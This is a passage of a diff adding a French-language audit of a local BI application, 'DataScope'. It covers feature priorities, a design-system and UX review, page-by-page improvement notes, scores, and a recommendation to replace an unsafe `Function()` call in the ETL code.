+| Comparaison temporelle | Intermediaire | Multi-sources, MTD/YTD, delta valeur/pourcentage |
+| O365 | POC | Auth OAuth 2.0 + PKCE, backup OneDrive, partage liens |
+| Settings | Tres avancee | 25+ parametres, referentiels finance (PCG/IFRS), diagnostics |
+
+### Types de graphiques (15)
+
+bar, column, line, area, pie, donut, radial, radar, treemap, sunburst, funnel, stacked-bar, stacked-column, stacked-area, percent-bar/percent-column
+
+### Agregations
+
+count, sum, avg, min, max, list (pivot) + first, last (ETL)
+
+---
+
+## 5. Fonctionnalites et ameliorations a apporter
+
+### Priorite 1 - Fondamentaux manquants
+
+#### P1.1 - Qualite et profilage des donnees
+**Justification** : Un outil BI sans profilage oblige l'utilisateur a decouvrir les problemes de qualite apres coup, dans les graphiques ou pivots. C'est le fondement de toute analyse fiable.
+
+- Profil automatique a l'import : completude par colonne (% nulls), distribution (min/max/moyenne/mediane/ecart-type), cardinalite, detection de patterns (email, telephone, code postal)
+- Score de qualite par dataset (completude, coherence, unicite)
+- Detection d'outliers (IQR ou Z-score) avec marquage visuel
+- Detection de doublons configurable (exact ou fuzzy)
+- Regles de validation personnalisables (min/max, regex, foreign keys entre datasets)
+
+**Impact** : Tres eleve | **Effort** : Important
+
+#### P1.2 - Undo/Redo global
+**Justification** : L'absence d'annulation freine l'exploration. L'utilisateur hesite a experimenter (supprimer une colonne, modifier une formule) par peur de perdre son etat. Aucun outil BI professionnel ne fonctionne sans undo.
+
+- Stack d'historique (20-50 actions) via Immer.js ou patches
+- Raccourcis Ctrl+Z / Ctrl+Y
+- Indicateur visuel du nombre d'actions annulables
+- Couvrir : modifications de donnees, config pivot, widgets, formules
+
+**Impact** : Tres eleve | **Effort** : Moyen
+
+#### P1.3 - Systeme de notifications et feedback structure
+**Justification** : L'application utilise `alert()` natif dans `exportUtils.ts` pour les erreurs. C'est bloquant, non style, et ne permet pas de notification asynchrone.
+
+- Toasts (Sonner ou React Hot Toast) : succes, erreur, warning, info
+- Notifications non-bloquantes pour les operations longues (import, export, calcul pivot)
+- Confirmation modale stylisee au lieu de `window.confirm()`
+- Progress bar pour les operations longues (import gros fichier, export PDF)
+
+**Impact** : Eleve | **Effort** : Faible
+
+#### P1.4 - Audit trail et historique des modifications
+**Justification** : Pour un outil budget/forecast, la tracabilite est non-negociable. L'absence d'audit trail rend impossible de savoir quand une valeur budgetaire a ete modifiee.
+
+- Journal des modifications (timestamp, action, valeur avant/apres)
+- Historique consultable par dataset, budget, forecast
+- Diff visuel entre deux etats
+- Possibilite de restaurer un etat anterieur
+
+**Impact** : Eleve | **Effort** : Moyen
+
+---
+
+### Priorite 2 - Enrichissement analytique
+
+#### P2.1 - Scatter plot et graphiques statistiques
+**Justification** : L'absence de scatter plot est un trou fonctionnel majeur. C'est le graphique de base pour la correlation, la segmentation, et l'analyse multi-variables.
+
+- Scatter plot (2 axes numeriques + taille de bulle + couleur par categorie)
+- Bubble chart (3 dimensions)
+- Heatmap / matrice de correlation
+- Box plot pour la distribution
+- Histogramme (bins automatiques ou manuels)
+- Waterfall chart (essentiel pour le module finance)
+
+**Impact** : Eleve | **Effort** : Moyen
+
+#### P2.2 - Drill-through du dashboard vers les donnees
+**Justification** : Cliquer sur un KPI ou un segment de graphique pour voir les lignes sous-jacentes est la base de l'exploration BI. Le drill-down existe dans le pivot, mais le passage dashboard vers donnees detaillees est absent.
+
+- Clic sur widget KPI => drawer avec les lignes correspondantes
+- Clic sur segment de graphique => filtrage et affichage des lignes
+- Navigation dashboard => DataExplorer avec filtres pre-appliques
+- Breadcrumb de navigation pour revenir au dashboard
+
+**Impact** : Eleve | **Effort** : Moyen
+
+#### P2.3 - Planification des pipelines ETL
+**Justification** : Les pipelines sont executees manuellement. Pour un usage quotidien, il faut pouvoir programmer leur execution.
+
+- Timer configurable par pipeline
+- Execution automatique a l'ouverture
+- Log d'execution avec succes/echec et duree
+
+**Impact** : Moyen | **Effort** : Moyen
+
+#### P2.4 - Data lineage
+**Justification** : Avec les pipelines ETL, jointures, champs calcules et datasets derives, il devient impossible de savoir d'ou vient une donnee.
+
+- Graphe visuel source => transformation => dataset derive => widget
+- Clic sur un champ => provenance (source brute, formule, jointure)
+- Impact analysis : modifier ce dataset source => quels widgets/budgets affectes ?
+
+**Impact** : Moyen | **Effort** : Important
+
+---
+
+### Priorite 3 - Confort et productivite
+
+#### P3.1 - Command palette (Ctrl+K)
+Recherche globale : pages, datasets, analyses sauvegardees, actions rapides. Avec 12 pages et potentiellement des dizaines de datasets, la navigation par sidebar seule est lente.
+
+**Impact** : Moyen | **Effort** : Faible
+
+#### P3.2 - Commentaires et annotations sur les graphiques
+Meme en usage individuel, annoter un graphique ("pic du a la campagne Q2") ou un KPI permet de conserver le contexte metier. Annotations positionnees, commentaires par widget, export avec annotations.
+
+**Impact** : Moyen | **Effort** : Moyen
+
+#### P3.3 - Templates de dashboards et d'analyses
+Galerie de templates par domaine metier (finance, ventes, RH). Import/export de templates. Templates adaptatifs (detection des champs disponibles).
+
+**Impact** : Moyen | **Effort** : Moyen
+
+#### P3.4 - Export et partage enrichis
+Export PDF avec page de garde configurable, pied de page, numerotation. Export PowerPoint. Export planifie. Embed iframe pour integration intranet.
+
+**Impact** : Moyen | **Effort** : Important
+
+---
+
+### Priorite 4 - Intelligence et automatisation
+
+#### P4.1 - Suggestions intelligentes de graphiques
+Analyser les donnees (nombre de dimensions/mesures, cardinalite) pour recommander le type de visualisation optimal avec un score de pertinence.
+
+**Impact** : Faible | **Effort** : Moyen
+
+#### P4.2 - ML avance pour le forecasting
+Prophet-like decomposition (trend + saisonnalite + jours feries), EMA/WMA, detection automatique de periodicite, cross-validation temporelle, intervalles de confiance.
+
+**Impact** : Faible | **Effort** : Important
+
+---
+
+### Matrice de priorisation fonctionnelle
+
+| # | Fonctionnalite | Impact | Effort | ROI |
+|---|----------------|--------|--------|-----|
+| P1.3 | Toasts / Notifications | Eleve | Faible | **Tres eleve** |
+| P1.2 | Undo/Redo | Tres eleve | Moyen | **Tres eleve** |
+| P3.1 | Command palette (Ctrl+K) | Moyen | Faible | **Eleve** |
+| P1.1 | Profilage donnees | Tres eleve | Important | Eleve |
+| P1.4 | Audit trail | Eleve | Moyen | Eleve |
+| P2.1 | Scatter/Heatmap/Waterfall | Eleve | Moyen | Eleve |
+| P2.2 | Drill-through dashboard | Eleve | Moyen | Eleve |
+| P2.3 | Planification ETL | Moyen | Moyen | Moyen |
+| P3.2 | Annotations graphiques | Moyen | Moyen | Moyen |
+| P3.3 | Templates dashboards | Moyen | Moyen | Moyen |
+| P2.4 | Data lineage | Moyen | Important | Moyen |
+| P3.4 | Export enrichi (PPT, planifie) | Moyen | Important | Moyen |
+| P4.1 | Suggestions graphiques | Faible | Moyen | Faible |
+| P4.2 | ML avance forecasting | Faible | Important | Faible |
+
+---
+
+# Partie 3 - Analyse UX / Design
+
+## 6. Design system
+
+### Points positifs
+
+**Architecture de tokens solide** (`index.css`, `tailwind.config.js`)
+- 9 palettes couleur semantiquement nommees (`--brand-50` a `--brand-900`)
+- Tokens de surface, texte et statut bien structures
+- 3 styles visuels (Default, Material, Glass avec backdrop-filter)
+- Configuration Tailwind externalisee, propre, avec `darkMode: 'class'`
+- Variables CSS dans `@layer base` (bonne pratique Tailwind)
+
+**Composants UI reutilisables**
+- `Button.tsx` : 5 variants (primary, secondary, danger, outline, ghost) + 4 tailles + loading + icon
+- `Modal.tsx` : `role="dialog"`, `aria-modal="true"`, `aria-labelledby`, fermeture Escape
+- `Tabs.tsx` : Navigation clavier (ArrowLeft/Right, Home/End), `role="tablist"`, `aria-selected`
+- `Badge.tsx` : 6 variants coherents avec les status colors
+- `MultiSelect.tsx` : Select/Deselect all, detection clic exterieur
+
+### Axes d'amelioration
+
+- **Pas de systeme d'espacement formalise** : `p-6`, `gap-4`, `mt-2` codes en dur au lieu de tokens
+- **`Modal.tsx` sans focus trap** : le focus peut s'echapper de la modale (violation WCAG 2.1 AA)
+- **`MultiSelect.tsx`** : pas de recherche dans les options, pas de virtualisation (lent avec 100+ items)
+- **Pas de `prefers-reduced-motion`** : les animations (blobs glass, transitions) ne sont pas desactivables
+- **Quelques couleurs Tailwind hardcodees** (`bg-slate-100`, `text-gray-600`) au lieu des tokens CSS, cassant le dark mode par endroits
+
+---
+
+## 7. Layout et navigation
+
+### Points positifs (`Layout.tsx`, `Sidebar.tsx`)
+
+- Navigation claire en 12 sections avec icones Lucide coherentes
+- Sidebar collapsible avec indicateur de stockage en temps reel
+- IDs d'onboarding tour sur chaque element de navigation
+- Sauvegarde rapide integree dans le footer de la sidebar
+
+### Axes d'amelioration
+
+- **Pas de breadcrumb** : impossible de situer la page courante dans la hierarchie
+- **Pas de recherche globale** : navigation exclusivement par menu
+- **Mobile confus** : sidebar 12 items en bottom bar, trop encombre ; une bottom navigation a 4-5 items + "Plus" serait preferable
+- **Pas de notification de limite disque** proactive a l'approche de la saturation
+
+---
+
+## 8. Analyse detaillee par page
+
+### 8.1 Dashboard
+
+**Points positifs** : Grille responsive (4/2/1 colonnes), mode edition, empty state engageant ("Creer mon premier widget"), fullscreen, filtres globaux, drag & drop.
+
+**Axes d'amelioration** :
+- Pas de groupes/sections thematiques pour organiser les widgets
+- Pas de refresh automatique des donnees
+- Pas d'URL partageable pour un etat specifique du dashboard
+
+### 8.2 Import
+
+**Points positifs** : Workflow 3 etapes (Input => Mapping => Confirm), drag & drop avec feedback visuel, selecteur d'encodage, auto-mapping intelligent, apprentissage des mappings.
+
+**Axes d'amelioration** :
+- Validation tardive (erreurs a la confirmation, apres le mapping)
+- Pas de preview avant/apres pour les transformations de nettoyage
+- Pas de detection de doublons a l'import
+- Pas de barre de progression pour les gros fichiers
+
+### 8.3 Pivot Table
+
+**Points positifs** : Drag & drop entre 4 zones, virtualisation, comparaison temporelle, conditional formatting, 15 types de graphiques, export multi-format. Le refactoring via `usePivotLogic.ts` a rendu la page lisible (200 lignes).
+
+**Axes d'amelioration** :
+- Pas de feedback visuel pendant le drag (zones de depot non mises en surbrillance)
+- Pas de mode "calcul differe" (chaque changement recalcule immediatement)
+- D&D inaccessible au clavier
+
+### 8.4 Data Explorer
+
+**Points positifs** : Colonnes redimensionnables, edition inline, filtrage par colonne (regex ou exact), VLOOKUP entre datasets, champs calcules, conditional formatting.
+
+**Axes d'amelioration** :
+- 27 `useState` dans un composant (1575 lignes) : a refactorer
+- Pas de reordonnancement de colonnes
+- Pas de grouping avec sous-totaux
+- Pas d'export de la vue filtree
+- VLOOKUP : UX confuse avec drawers imbriques
+
+### 8.5 Analysis Studio
+
+**Points positifs** : Basculement Snapshot/Trend fluide, modes de couleur (Multi, Single, Gradient), sauvegarde/chargement d'analyses.
+
+**Axes d'amelioration** :
+- 30 `useState`, 1872 lignes : a refactorer
+- Forecast prevu dans le code (`showForecast`) mais non implemente
+- Pas de scatter plot
+- Pas de query builder visuel pour les filtres
+
+### 8.6 Budget
+
+**Points positifs** : 6 onglets organises, edition inline, workflow de validation, import/export Excel, axes analytiques.
+
+**Axes d'amelioration** :
+- 2296 lignes, 31 `useState` : le plus gros fichier du projet
+- Pas de formules dans les cellules (saisie manuelle uniquement)
+- Workflow sans UI visible (statuts geres dans le code mais flux non visible)
+- Pas d'audit trail
+- Pas d'export PDF
+
+### 8.7 Forecast
+
+**Points positifs** : 5 methodes de prevision, rolling forecast, reconciliation avec MAPE/RMSE, drivers.
+
+**Axes d'amelioration** :
+- ML basique (tendance lineaire et saisonnalite simple)
+- Pas de graphique de reconciliation
+- Pas de waterfall chart pour les ecarts budget/realise
+
+### 8.8 ETL Pipeline
+
+**Points positifs** : Editeur visuel avec nodes et connexions, 18 transformations, preview a chaque etape.
+
+**Axes d'amelioration** :
+- Canvas non zoomable (sature pour les pipelines complexes)
+- Pas de minimap
+- Execution manuelle uniquement
+- **Vulnerabilite `Function()`** (cf. point 2.1)
+
+### 8.9 Settings
+
+**Points positifs** : Organisation par sections avec recherche, referentiels financiers complets, diagnostics integres, backup/restore avec selection partielle.
+
+**Axes d'amelioration** :
+- 1464 lignes : devrait etre decompose en sous-routes
+- Restore sans validation du backup
+- Diagnostics sans action corrective proposee
+
+---
+
+## 9. Patterns UX transversaux
+
+| Pattern | Implementation actuelle | Qualite |
+|---------|------------------------|---------|
+| Loading | `<Loader2 className="animate-spin" />` + page de chargement Suspense | Correcte |
+| Succes | Messages texte ephemeres | Basique |
+| Erreur | `alert()` dans exportUtils (2 occurrences) | Insuffisant |
+| Confirmation | Aucune modale de confirmation identifiee | Manquant |
+| Progression | Absente pour les operations longues | Manquant |
+| Undo | Absent | Manquant |
+| Crash recovery | ErrorBoundary avec "Reessayer" + "Accueil" | Bonne |
+
+### Onboarding
+- State `hasSeenOnboarding` et `completeOnboarding()` presents dans DataContext
+- IDs de tour places sur la navigation (`tour-nav-*`)
+- Aucune librairie de tour integree (pas de Shepherd, introjs)
+- **Non fonctionnel**
+
+### Raccourcis clavier
+- Escape pour fermer les modales
+- ArrowLeft/Right pour la navigation dans les tabs
+- **Manquants** : Ctrl+S (sauvegarder), Ctrl+Z (undo), Ctrl+K (recherche), Ctrl+E (export)
+
+---
+
+## 10. Scoring et recommandations UX
+
+| Categorie | Score | Justification |
+|-----------|-------|---------------|
+| Coherence visuelle | 8/10 | Design system solide, tokens bien structures, 3 styles visuels |
+| Composants reutilisables | 7/10 | Bonne base mais manques (focus trap, indeterminate, search dans MultiSelect) |
+| Architecture front | 6/10 | Code splitting OK, Error Boundary OK, mais 6 fichiers monolithiques restants |
+| Accessibilite | 5/10 | ARIA sur Button/Modal/Tabs, mais pas de focus trap, D&D inaccessible, pas de skip-link |
+| Performance percue | 6/10 | Virtualisation + lazy loading OK, mais 88 states dans 3 composants = re-renders |
+| Responsive mobile | 5/10 | Layout adaptatif mais sidebar 12 items en bottom bar |
+| Feedback utilisateur | 4/10 | `alert()` natif, pas de toasts, pas d'undo, pas de progress |
+| Decouverte | 4/10 | Onboarding non fonctionnel, pas d'aide contextuelle |
+| **Moyenne** | **5.6/10** | |
+
+### Recommandations UX par impact
+
+**Tier 1 - Impact eleve, effort modere**
+1. Remplacer `alert()` par des toasts (Sonner) - toutes les pages
+2. Focus trap dans `Modal.tsx` - conformite WCAG 2.1 AA
+3. Refactoring etat Budget/AnalysisStudio/DataExplorer (comme fait pour PivotTable)
+4. Bottom navigation mobile : 5 items + menu "Plus"
+5. `prefers-reduced-motion` : desactiver les animations
+
+**Tier 2 - Impact modere**
+6. Breadcrumb de navigation contextuel
+7. Undo/Redo (Ctrl+Z / Ctrl+Y) avec indicateur visuel
+8. Feedback D&D dans le pivot : zones de depot en surbrillance
+9. Progress bar pour operations longues (import, export, calcul)
+10. Dark mode complet : remplacer les classes Tailwind hardcodees par tokens CSS
+
+**Tier 3 - Nice to have**
+11. Command palette (Ctrl+K)
+12. Raccourcis clavier documentes
+13. Onboarding tour fonctionnel (Shepherd.js)
+14. Aide contextuelle (icones info avec tooltips)
+15. Skeleton loaders au lieu de spinners
+
+---
+
+## Conclusion
+
+DataScope est une application BI locale remarquablement riche. Le refactoring recent a traite les problemes les plus critiques (CDN, CSP, code splitting, Error Boundary, decomposition de `utils.ts` et `PivotTable.tsx`, `generateId` securise).
+
+**Les 3 chantiers les plus impactants restants** :
+
+1. **Securite ETL** (Critique) : Remplacer `Function()` dans `transformations.ts:384` par le `FormulaParser` existant. C'est une correction ponctuelle a fort impact securitaire.
+
+2. **Refactoring des 6 fichiers monolithiques** (Haute) : Appliquer le pattern PivotTable (hook custom + decomposition en sous-composants) a Budget, AnalysisStudio, DataExplorer, Settings, Forecast et ChartModal. Cela améliorera la maintenabilite, les performances, et la capacite a tester.
+
+3. **Feedback UX** (Haute) : Remplacer les `alert()` par des toasts, ajouter l'undo/redo, et implementer le profilage de donnees. Ce sont les fonctionnalites qui transforment un outil technique en produit utilisable au quotidien.
